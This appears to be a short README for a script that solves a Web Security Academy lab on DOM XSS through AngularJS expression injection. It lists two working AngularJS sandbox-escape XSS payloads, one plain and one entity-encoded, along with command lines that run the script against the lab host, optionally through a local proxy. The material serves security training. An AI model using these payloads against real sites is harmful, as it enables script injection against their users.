# How to run script.py

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

#### {{constructor.constructor('alert(\"XSS\")')()}}

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "{{constructor.constructor('alert(\"XSS\")')()}}"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "{{constructor.constructor('alert(\"XSS\")')()}}" -p 127.0.0.1:8080`

#### {{[].pop.constructor%26%2340'alert\u00281\u0029'%26%2341%26%2340%26%2341}}

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "{{[].pop.constructor%26%2340'alert\u00281\u0029'%26%2341%26%2340%26%2341}}"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "{{[].pop.constructor%26%2340'alert\u00281\u0029'%26%2341%26%2340%26%2341}}" -p 127.0.0.1:8080`
